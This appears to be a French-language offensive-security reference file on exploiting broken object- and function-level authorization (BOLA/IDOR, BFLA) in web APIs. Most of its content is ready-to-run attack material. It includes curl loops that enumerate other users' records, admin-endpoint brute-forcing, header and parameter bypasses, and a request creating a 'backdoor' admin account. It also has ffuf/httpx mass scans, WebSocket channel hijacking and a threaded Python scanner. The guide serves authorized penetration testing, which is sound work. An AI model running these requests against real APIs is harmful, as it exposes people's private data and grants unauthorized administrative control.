---
name: api-bola-bfla
description: Guide avancé des Broken Object Level Authorization (BOLA/IDOR) et Broken Function Level Authorization (BFLA) dans les API — hiérarchie d'objets, batch IDOR, mass assignment ACL, privilege escalation vertical/horizontal, et tools
category: cybersecurite
---

# BOLA & BFLA — Broken Authorization Deep Dive

## Introduction

**BOLA (API1-2023)** : L'attaquant accède à des objets auxquels il n'a pas les droits en manipulant les identifiants. **BFLA (API5-2023)** : L'attaquant exécute des fonctions réservées aux administrateurs.

## 1. BOLA — Broken Object Level Authorization

### 1.1 IDOR Basique — Numeric ID

```bash
# Incrémentation d'ID
GET /api/v1/users/1  → profil public
GET /api/v1/users/2  → profil privé d'un autre utilisateur
GET /api/v1/users/3  → profil admin

# Range scan
for id in $(seq 1 1000); do
  resp=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    https://api.target.com/api/v1/users/$id \
    -H "Authorization: Bearer <token>")
  size=$(echo $resp | awk '{print $2}')
  [ "$size" -gt 100 ] && echo "[$resp] /api/v1/users/$id"
done
```

### 1.2 UUID / GUID Manipulation

```bash
# UUID prédictibles
# UUID v1 = timestamp + MAC address
# Décoder UUID v1
echo "550e8400-e29b-11d4-a716-446655440000" | python3 -c "
import sys, uuid
u = uuid.UUID(sys.stdin.read().strip())
print(f'Timestamp: {u.time}')
print(f'Node: {u.node:012x}')
"

# UUID séquentiel (type 4 mais basé sur timestamp)
# Si l'UUID est incrémental
GET /api/v1/orders/550e8400-e29b-11d4-a716-446655440000
GET /api/v1/orders/550e8400-e29b-11d4-a716-446655440001  # UUID+1
GET /api/v1/orders/550e8400-e29b-11d4-a716-446655440002

# UUID dans différents formats
/api/v1/users/550e8400e29b11d4a716446655440000  # sans tirets
/api/v1/users/{550e8400-e29b-11d4-a716-446655440000}  # avec accolades
/api/v1/users/urn:uuid:550e8400-e29b-11d4-a716-446655440000  # URN
```

### 1.3 IDOR via Objets Liés

```bash
# Accéder aux objets d'un autre utilisateur
# 1. Connaître son propre ID
GET /api/v1/users/me → {"id": 123, ...}

# 2. Changer l'ID dans les endpoints liés
GET /api/v1/users/456/orders  # commandes de l'utilisateur 456
GET /api/v1/users/456/invoices
GET /api/v1/users/456/payment-methods
GET /api/v1/users/456/documents
GET /api/v1/users/456/addresses

# 3. Accès aux messages privés
GET /api/v1/messages?userId=456
GET /api/v1/conversations?participant=456

# 4. Documents uploadés
GET /api/v1/uploads/789/documents/id_card.jpg
```

### 1.4 IDOR Hiérarchique

```bash
# Hiérarchie: Organization → Team → User → Order → Invoice
# Si l'user peut voir l'org, peut-être peut-il voir celles des autres

# Élévation dans la hiérarchie
GET /api/v1/organizations/1  → son organisation
GET /api/v1/organizations/2  → organisation concurrente
GET /api/v1/organizations/3/teams  → équipes d'autres organisations
GET /api/v1/organizations/3/users  → users d'autres organisations
GET /api/v1/organizations/3/invoices

# Descendance
GET /api/v1/orders/1 → commande d'un autre utilisateur
GET /api/v1/orders/1/invoice → facture liée
GET /api/v1/orders/1/payments
GET /api/v1/orders/1/shipments
GET /api/v1/orders/1/items

# Transversal
GET /api/v1/invoices?organizationId=2
GET /api/v1/reports?companyId=5
```

### 1.5 Batch IDOR

```bash
# Récupérer plusieurs objets à la fois
POST /api/v1/users/batch
{"ids": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]}

POST /api/v1/users/query
{"filter": {"id__in": ["1", "2", "3"]}}

# Injection via paramètres
POST /api/v1/orders/export
{"userIds": [1, 2, 3, 4, 5]}  # exporte les commandes de tous

# Wildcard
GET /api/v1/users/*
GET /api/v1/users/%
GET /api/v1/users/_
GET /api/v1/users?limit=1000
```

### 1.6 Blind IDOR — Time-Based

```bash
# IDOR sans réponse visible
# Timing attack sur les IDs existants vs non-existants
for id in 1 2 3 4 5 100 500 1000; do
  start=$(date +%s%N)
  curl -s https://api.target.com/api/v1/users/$id \
    -H "Authorization: Bearer <user_token>" > /dev/null
  end=$(date +%s%N)
  echo "User $id: $(((end-start)/1000000))ms"
done

# Status code analysis
for id in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} %{size_download}\n" \
    https://api.target.com/api/v1/users/$id
done
# 200 + body présent → existe, 403 → existe mais interdit, 404 → n'existe pas
```

## 2. BFLA — Broken Function Level Authorization

### 2.1 Admin Function Discovery

```bash
# Découvrir les endpoints admin
for path in admin admin/users admin/orders admin/products \
            admin/settings admin/config admin/roles \
            admin/permissions admin/logs admin/audit \
            admin/backup admin/export admin/import \
            admin/migrate admin/deploy admin/commands; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" \
    https://api.target.com/api/v1/$path \
    -H "Authorization: Bearer <user_token>")
  [ "$resp" != "404" ] && echo "[$resp] /api/v1/$path"
done
```

### 2.2 HTTP Method Abuse

```bash
# Changer la méthode pour bypasser les ACL
# GET est autorisé, POST n'est pas censé l'être

# Au lieu de POST (admin only)
GET /api/v1/admin/users/delete/5
GET /api/v1/admin/users?action=delete&id=5

# POST → PUT abuse
PUT /api/v1/admin/users/5/role
{"role": "admin"}

# PATCH abuse
PATCH /api/v1/admin/users/5
[{"op": "replace", "path": "/role", "value": "admin"}]

# OPTIONS — lister les méthodes disponibles
curl -X OPTIONS https://api.target.com/api/v1/admin/users \
  -H "Authorization: Bearer <user_token>"
# → Allow: GET, POST, PUT, DELETE, PATCH
```

### 2.3 Parameter-Based Function Abuse

```bash
# Fonctions admin via paramètres
GET /api/v1/products?admin=true
GET /api/v1/products?isAdmin=1
GET /api/v1/products?role=admin
GET /api/v1/products?override=true
GET /api/v1/products?debug=1
GET /api/v1/products?dev=true
GET /api/v1/products?sudo=1
GET /api/v1/products?bypass=true

# Header-based admin
GET /api/v1/users
X-Admin: true
X-User-Role: admin
X-Bypass-Auth: true
X-Original-URL: /admin/users
```

### 2.4 Role Enumeration

```bash
# Découvrir les rôles possibles
POST /api/v1/auth/signup
{"username": "test", "password": "test", "role": "admin"}  # 201 ?
POST /api/v1/auth/signup
{"username": "test", "password": "test", "role": "superadmin"}  # 201 ?
POST /api/v1/auth/signup
{"username": "test", "password": "test", "role": "moderator"}  # 201 ?

# Ou en PATCH
PATCH /api/v1/users/me
{"role": "admin"}  # 200 ?

# Header role
POST /api/v1/auth/signup
Role: admin
X-User-Role: admin
```

### 2.5 Vertical Privilege Escalation

```bash
# User → Admin
# 1. Se connecter en tant que user normal
# 2. Appeler l'endpoint admin directement
curl -X POST https://api.target.com/api/v1/admin/users \
  -H "Authorization: Bearer <user_token>" \
  -d '{"username": "backdoor", "role": "admin"}'

# User → Super Admin
GET /api/v1/admin/super/export/users

# User → Organization Admin
GET /api/v1/organizations/3/admin/settings
```

## 3. Tools & Automation

### 3.1 Autorize (Burp Extension)

```bash
# Burp Autorize
# 1. Installer Autorize depuis BApp Store
# 2. Ajouter un token de user basique dans Autorize
# 3. Naviguer en tant qu'admin → Autorize replay chaque requête avec le token basique
# 4. Si réponse 200, c'est un BOLA/BFLA

# AuthMatrix (Burp)
# 1. Définir les rôles: anonymous, user, moderator, admin
# 2. Définir les endpoints à tester
# 3. Matrice des résultats: code HTTP par rôle
```

### 3.2 AutoRepeater (Burp)

```bash
# AutoRepeater — remplacer automatiquement les IDs
# 1. Installer AutoRepeater
# 2. Configurer une règle: remplacer /users/123 par /users/456
# 3. Naviguer → toutes les requêtes sont rejouées avec l'ID modifié
# 4. Voir les réponses en diff
```

### 3.3 Custom ACL Scanner

```python
#!/usr/bin/env python3
"""Scanner BOLA/BFLA automatisé."""
import requests
import json
from concurrent.futures import ThreadPoolExecutor

BASE = "https://api.target.com"
USER_TOKEN = "Bearer <user_token>"
ADMIN_TOKEN = "Bearer <admin_token>"

ENDPOINTS = [
    ("GET", "/api/v1/users/1"),
    ("GET", "/api/v1/users/2"),
    ("GET", "/api/v1/admin/users"),
    ("GET", "/api/v1/admin/settings"),
    ("POST", "/api/v1/admin/users", {"username": "test"}),
    ("DELETE", "/api/v1/users/1"),
    ("GET", "/api/v1/orders/1"),
    ("GET", "/api/v1/invoices/1"),
]

def test_bola(endpoint):
    method, path = endpoint[0], endpoint[1]
    data = endpoint[2] if len(endpoint) > 2 else None

    # Requête avec token user basique
    resp_user = requests.request(method, BASE + path,
        headers={"Authorization": USER_TOKEN},
        json=data)

    # Requête avec token admin
    resp_admin = requests.request(method, BASE + path,
        headers={"Authorization": ADMIN_TOKEN},
        json=data)

    # Comparer les codes/réponses
    if resp_user.status_code not in [401, 403]:
        print(f"[BOLA] {method} {path}")
        print(f"  Tokens: USER={resp_user.status_code} vs ADMIN={resp_admin.status_code}")
        if resp_user.status_code == 200 and resp_admin.status_code == 200:
            if resp_user.text != resp_admin.text:
                print(f"  Différences dans la réponse!")
                user_data = len(resp_user.text)
                admin_data = len(resp_admin.text)
                print(f"  USER: {user_data}B, ADMIN: {admin_data}B")

    # Test sans token
    resp_noauth = requests.request(method, BASE + path, json=data)
    if resp_noauth.status_code in [200, 201, 204]:
        print(f"[NO AUTH] {method} {path} → {resp_noauth.status_code}")

def scan():
    with ThreadPoolExecutor(max_workers=10) as ex:
        ex.map(test_bola, ENDPOINTS)

if __name__ == "__main__":
    scan()
```

## 4. IDOR via API Patterns

### 4.1 Nested Object IDOR

```json
// API REST standard
GET /api/v1/users/123/orders/456  // Vérification: user_id = token.user_id?

// Si seule la commande est vérifiée mais pas l'user
GET /api/v1/users/999/orders/789  // On change user_id → même commande

// Nested param injection
GET /api/v1/orders/456?include=user.balance
GET /api/v1/orders/456?expand=user.billing.address
```

### 4.2 Response Parameter Pollution

```bash
# Si l'API supporte ?fields= ou ?include=
GET /api/v1/users/2?fields=id,email,password,ssn,creditCard
GET /api/v1/users/2?include=private_info
GET /api/v1/users/2?expand=all
```

### 4.3 Mass IDOR Scanning

```bash
# Avec ffuf
ffuf -u https://api.target.com/api/v1/users/FUZZ \
  -w <(seq 1 100) \
  -H "Authorization: Bearer <token>" \
  -fc 404,403,401 \
  -o idor_results.json

# Avec httpx
seq 1 100 | httpx -path "/api/v1/users/{}" \
  -H "Authorization: Bearer <token>" \
  -mc 200 -silent
```

## 5. IDOR via WebSocket / Server-Sent Events

```bash
# WebSocket — écouter les événements d'un autre utilisateur
wscat -c wss://api.target.com/ws
> {"subscribe": "user:456:updates"}  # ← IDOR sur le canal WebSocket
# Messages temps réel de l'utilisateur 456

# SSE
curl -N https://api.target.com/api/v1/events?userId=456
# Événements de l'utilisateur 456 en push
```

## 6. Cache-Based IDOR

```bash
# Si les réponses API sont mises en cache
# et que le cache est basé sur l'URL sans tenir compte des droits
# User A accède /api/v1/orders/1 → 200 (sa commande)
# User B accède /api/v1/orders/1 → 200 (cache hit, même si pas sa commande)
```

## Checklist

- [ ] IDOR numérique (incrémentation d'ID)
- [ ] IDOR UUID (prédictible, v1 timestamp)
- [ ] IDOR sur objets liés (users/ID/orders)
- [ ] IDOR hiérarchique (org→team→user)
- [ ] Batch IDOR (batch endpoint, wildcard)
- [ ] IDOR via paramètres (filter, query)
- [ ] Blind IDOR (timing, status codes)
- [ ] BFLA admin endpoints (methods, paths)
- [ ] HTTP method abuse (GET→POST, etc.)
- [ ] Parameter-based admin bypass
- [ ] Header-based admin bypass
- [ ] Role parameter (mass assignment)
- [ ] Vertical privilege escalation
- [ ] Horizontal privilege escalation
- [ ] WebSocket IDOR
- [ ] Cache-based IDOR
- [ ] Response field expansion abuse
- [ ] Tools: Autorize, AuthMatrix, AutoRepeater

## Ressources

- **OWASP API1: Broken Object Level Authorization** : https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- **OWASP API5: Broken Function Level Authorization** : https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/
- **HackTricks IDOR** : https://book.hacktricks.wiki/en/pentesting-web/idor/index.html
- **PortSwigger IDOR** : https://portswigger.net/web-security/access-control/idor
- **Autorize Burp** : https://github.com/Quitten/Autorize